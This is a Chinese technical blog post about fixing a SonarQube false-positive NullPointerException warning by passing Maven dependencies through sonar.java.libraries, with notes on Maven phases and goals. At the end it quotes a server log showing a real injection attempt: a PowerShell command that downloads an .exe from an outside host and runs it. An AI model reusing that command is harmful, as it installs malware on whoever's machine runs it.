<!doctype html><html xmlns:wb=http://open.weibo.com/wb lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=description content="Commons-lang StringUtils isNotBlank method still raise NPE"><meta name=generator content="Hugo 0.134.0"><title>Sonar扫描的NPE问题 &#183; 戈壁堂</title>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/pure-min.css><!--[if lte IE 8]><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-old-ie-min.css><![endif]--><!--[if gt IE 8]><!--><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-min.css><!--<![endif]--><!--[if lte IE 8]><link rel=stylesheet href=http://gebitang.com/css/side-menu-old-ie.css><![endif]--><!--[if gt IE 8]><!--><link rel=stylesheet href=http://gebitang.com/css/side-menu.css><!--<![endif]--><link rel=stylesheet href=http://gebitang.com/css/blackburn.css><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.9.0/css/all.css><link href="https://fonts.googleapis.com/css?family=Raleway" rel=stylesheet type=text/css><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><link rel=stylesheet href=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/androidstudio.min.css><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/yaml.min.js></script><script>hljs.initHighlightingOnLoad()</script><link rel="shortcut icon" href=http://gebitang.com/img/favicon.ico type=image/x-icon><link rel=stylesheet href=http://gebitang.com/css/my.css><script src=http://gebitang.com/js/my.js></script></head><body><div id=layout><a href=#menu id=menuLink class=menu-link><span></span></a><div id=menu><a class="pure-menu-heading brand" href=http://gebitang.com/>Gebitang</a><div class=pure-menu><ul class=pure-menu-list><li class=pure-menu-item><a class=pure-menu-link href=http://gebitang.com/><i class='fa fa-home fa-fw'></i>Home</a></li><li class=pure-menu-item><a class=pure-menu-link href=http://gebitang.com/post/><i class='fa fa-list fa-fw'></i>Posts</a></li><li class=pure-menu-item><a class=pure-menu-link href=http://gebitang.com/about/><i class='fa fa-user fa-fw'></i>About</a></li><li class=pure-menu-item><a class=pure-menu-link href=http://gebitang.com/contact/><i class='fa fa-phone fa-fw'></i>Contact</a></li><li class=pure-menu-item><a class=pure-menu-link href=http://gebitang.com/tags/><i class='fa fa-tags fa-fw'></i>Tags</a></li><li class=pure-menu-item><a class=pure-menu-link href=http://gebitang.com/topics/><i class='fa fa-folder fa-fw'></i>Topics</a></li></ul></div><div class="pure-menu social"><ul class=pure-menu-list></ul></div><div><div class=small-print><small><a rel=license href=http://creativecommons.org/licenses/by/4.0/><img alt=知识共享许可协议 style=border-width:0 src=https://i.creativecommons.org/l/by/4.0/80x15.png></a><br>本<span xmlns:dct=http://purl.org/dc/terms/ href=http://purl.org/dc/dcmitype/Text rel=dct:type>作品</span>由<a xmlns:cc=http://creativecommons.org/ns# href=http://gebitang.com property="cc:attributionName" rel=cc:attributionURL>&nbsp;Gebitang&nbsp;&nbsp;</a>采用<a rel=license href=http://creativecommons.org/licenses/by/4.0/>知识共享署名 4.0 国际许可协议</a>进行许可&nbsp;&copy; 2018</small></div><div class=small-print><small></small></div><div class=small-print><small>Built with&nbsp;<a href=https://gohugo.io/ target=_blank>Hugo</a></small>
<small>Theme&nbsp;<a href=https://github.com/yoshiharuyamashita/blackburn target=_blank>Blackburn</a></small></div><div style=display:none><div class=small-print><small><wb:follow-button uid=2446212465 type=red_1 width=67 height=24></wb:follow-button></small></div></div></div></div><div id=main><div class=header><h1>Sonar扫描的NPE问题</h1><h2>Commons-lang StringUtils isNotBlank method still raise NPE</h2></div><div class=content><div class=post-meta><div><i class="fa fa-calendar fa-fw"></i>
<time>2020-03-12</time></div><div><i class="fa fa-folder fa-fw"></i>
<a class=post-taxonomy-topic href=http://gebitang.com/topics/us>US</a></div></div><p><img src=https://aws1.discourse-cdn.com/sonarsource/uploads/sscommunity/original/2X/3/318735b08e742b4bab065a9821caa48762a4c697.png alt></p><p>直到我修改为这样的代码才通过——</p><pre tabindex=0><code>
public class DetectorImport {
    public String check1(Nonentity nonentity) {
        String s;
        if(nonentity == null) {
            s = null;
        }else {
            s = nonentity.getName();
        }
        if(s !=null) {
            s = s.replaceAll(&#34;（&#34;, &#34;(&#34;);
        }
        return s;
    }
}
</code></pre><p>查到的几个相关问题——
<a href=https://community.sonarsource.com/tags/c/bug/fp/7/java>https://community.sonarsource.com/tags/c/bug/fp/7/java</a></p><p><a href=https://community.sonarsource.com/t/sonarqube-is-raising-false-positive-npe/4515>Sonarqube is raising false-positive NPE</a></p><p>2019-07-19</p><blockquote><p>I expect that nonNull implementation is in the another file than the main code. Unfortunately that’s the current limitation we have for this rule. If you move nonNull in the file, FP should disappear.
This problem can’t be fixed easily, so for now I suggest you to mark issue as FP in SonarQube UI.
Anyway thanks for reporting it.</p></blockquote><p><a href=https://community.sonarsource.com/t/squid-s2259-a-nullpointerexception-could-be-thrown-dc-is-nullable-here-while-dc-is-checked-as-not-null/2616>squid:S2259 : A “NullPointerException” could be thrown; “dc” is nullable here. While “dc” is checked as not null</a></p><p><a href=https://groups.google.com/forum/#!topic/sonarqube/aluTP63hfyA>[JAVA] squid:S2259 False Positive with Utility methods</a>
这里提到是支持apache commen的StringUtils包的。</p><blockquote><p> We currently support methods from commons-lang StringUtils (<a href=https://commons.apache.org/proper/commons-lang/javadocs/api-2.6/org/apache/commons/lang/StringUtils.html>v2</a>, and <a href="https://www.google.com/url?q=https%3A%2F%2Fcommons.apache.org%2Fproper%2Fcommons-lang%2Fapidocs%2Forg%2Fapache%2Fcommons%2Flang3%2FStringUtils.html&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHiDHLeUkFJvzevRg_dwUkvTbt8nA">v3</a>), guava <a href=https://google.github.io/guava/releases/snapshot/api/docs/com/google/common/base/Preconditions.html#checkNotNull-T->preconditions</a>, and java 8 methods from java.util.Objects (nonNull, isNull, requireNonNull). As we know how these methods behave, we are able to correctly handle such call and discard similar FPs. Of course, I don&rsquo;t want to force you using such libraries to make the analyzer happy. :)</p></blockquote><p>report this on Sonar Community: <a href=https://community.sonarsource.com/t/commons-lang-stringutils-isnotblank-method-still-raise-npe/21517>Commons-lang StringUtils isNotBlank method still raise NPE</a></p><p>有人遇到了相同的问题，官方猜测是没有正确的配置<code>sonar.java.libraries</code></p><p>SonarQube上的确提示——</p><pre tabindex=0><code>Bytecode of dependencies was not provided for analysis of source files, you might end up with less precise results. Bytecode can be provided using sonar.java.libraries property.
</code></pre><p>手动验证，将commons-lang3-3.7.jar添加到<code>sonar.java.libraries</code>参数里，问题解决。</p><hr><p>下一步需要处理的方式——</p><blockquote><p>added the target “dependency:copy-dependencies” as part of the maven execution. This copied all the dependencies to the right location, then I set the property “-Dsonar.java.libraries=target/dependency” in our case.</p></blockquote><p>将项目的依赖都复制到固定的目录，然后将这个目录传递给<code>sonar.java.libraries</code>参数。</p><p><a href=http://maven.apache.org/plugins/maven-dependency-plugin/copy-dependencies-mojo.html>dependency:copy-dependencies</a>的官方用法。</p><p>理论上这样就可以解决这个问题，需要验证的是多模块的项目的依赖是否可以全部正确复制到正确的目录下。</p><hr><p>理论依据由别人提出</p><blockquote><p>added the target “dependency:copy-dependencies” as part of the maven execution. This copied all the dependencies to the right location, then I set the property “-Dsonar.java.libraries=target/dependency” in our case.</p></blockquote><p>我的实践如下——</p><p>这个插件的官方<a href=http://maven.apache.org/plugins/maven-dependency-plugin/usage.html>maven-dependency-plugin 使用文档</a>，根据<a href=https://maven.apache.org/plugins/maven-dependency-plugin/examples/copying-project-dependencies.html>样例</a>如下——</p><pre tabindex=0><code>&lt;plugin&gt;
    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
    &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;
    &lt;version&gt;3.1.2&lt;/version&gt;
    &lt;executions&gt;
        &lt;execution&gt;
        &lt;id&gt;copy-dependencies&lt;/id&gt;
        &lt;phase&gt;package&lt;/phase&gt;
        &lt;goals&gt;
            &lt;goal&gt;copy-dependencies&lt;/goal&gt;
        &lt;/goals&gt;
        &lt;configuration&gt;
            &lt;outputDirectory&gt;${project.build.directory}/alternateLocation&lt;/outputDirectory&gt;
            &lt;overWriteReleases&gt;false&lt;/overWriteReleases&gt;
            &lt;overWriteSnapshots&gt;false&lt;/overWriteSnapshots&gt;
            &lt;overWriteIfNewer&gt;true&lt;/overWriteIfNewer&gt;
        &lt;/configuration&gt;
        &lt;/execution&gt;
    &lt;/executions&gt;
&lt;/plugin&gt;
</code></pre><p>这样有两个问题：</p><ul><li>在多模块下自定义的这个outputDirectory目录是相对目录，会将依赖的jar包复制到子模块对应的目录下；</li><li>根据这里的<a href=https://stackoverflow.com/a/7676673/1087122>解决方案</a>使用变量<code>${session.executionRootDirectory}/target/</code>，可以强制将依赖包都复制到固定目录，但只能在执行 <code>mvn package</code>阶段才生效</li></ul><p>这样导致执行了接近全生命周期的任务。</p><p>这里涉及到<code>phase</code>、<code>goal</code>的概念区别：<a href=https://stackoverflow.com/questions/16205778/what-are-maven-goals-and-phases-and-what-is-their-difference>What are Maven goals and phases and what is their difference?</a></p><blockquote><p>Life cycle is a sequence of named <strong>phases</strong>.<br><strong>Phases</strong> executes sequentially. Executing a phase means executes all previous phases.</p></blockquote><blockquote><p><strong>Plugin</strong> is a collection of <strong>goals</strong> also called MOJO (<strong>M</strong>aven <strong>O</strong>ld <strong>J</strong>ava <strong>O</strong>bject).<br>Analogy : Plugin is a class and goals are methods within the class.</p></blockquote><p><a href=http://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html#Built-in_Lifecycle_Bindings>default Maven lifecycle bindings</a>这里定义了在各个“阶段”(phase)都会执行哪些“目标动作”(goals)</p><p><code>mvn [plugin-name]:[goal-name] </code>，例如<code>mvn dependency:copy-dependencies</code>就是执行了插件<code>maven-dependency-plugin</code>定义的<code>copy-dependencies</code>动作。进一步，对应的configuration可以通过变量进行传参。</p><p>经验证，使用绝对路径地址指定outputDirectory的值是，可以将多模块的依赖统一复制到指定目录下。</p><p>所以，最终的<strong>解决方案</strong>为：</p><ol><li>直接执行goal，<code>mvn dependency:copy-dependencies -DoutputDirectory=absolute/path/to/lib/dir</code>将所有的依赖复制到指定目录，</li><li>将上面的目录传递给sonar的<code>sonar.java.libraries</code>变量，例如 <code>-Dsonar.java.libraries=absolute/path/to/lib/dir/*.jar</code></li></ol><hr><p>没想到我这小破站也被扫描了——</p><pre tabindex=0><code>2020-03-09 13:48:49.794  INFO 2173 --- [p-nio-80-exec-3] org.apache.tomcat.util.http.Parameters   : Character decoding failed. Parameter [mail[#markup]] with value [ powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://ero.bckl.ir/download.exe&#39;,&#39;%SystemRoot%/Temp/zjajlhxadgirori21058.exe&#39;);start %SystemRoot%/Temp/zjajlhxadgirori21058.exe] has been ignored. Note that the name and value quoted here may be corrupted due to the failed decoding. Use debug level logging to see the original, non-corrupted values.
 Note: further occurrences of Parameter errors will be logged at DEBUG level.
2020-03-10 03:44:19.910  INFO 2173 --- [p-nio-80-exec-7] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.

java.lang.IllegalArgumentException: Invalid character found in the HTTP protocol
	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:532) ~[tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:294) ~[tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:853) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1587) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_232]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_232]
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_232]
</code></pre><div class="prev-next-post pure-g"><div class=pure-u-1-24 style=text-align:left><a href=http://gebitang.com/post/2020/0311-reason-of-pain/><i class="fa fa-chevron-left"></i></a></div><div class=pure-u-10-24><nav class=prev><a href=http://gebitang.com/post/2020/0311-reason-of-pain/>人的一切痛苦，本质上都是对自己无能的愤怒</a></nav></div><div class=pure-u-2-24>&nbsp;</div><div class=pure-u-10-24><nav class=next><a href=http://gebitang.com/post/2020/0313-be-a-good-man/>做好人难，一定要做好人</a></nav></div><div class=pure-u-1-24 style=text-align:right><a href=http://gebitang.com/post/2020/0313-be-a-good-man/><i class="fa fa-chevron-right"></i></a></div></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname=="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="gebitang",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=http://disqus.com/ class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></div></div><script src=http://gebitang.com/js/ui.js></script><script src=http://gebitang.com/js/menus.js></script><script>window.location.hostname!="localhost"&&(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","//www.google-analytics.com/analytics.js","ga"),ga("create","UA-34303694-1","auto"),ga("send","pageview"))</script><button onclick=topFunction() id=myBtn title="Go to top">Top</button></body></html>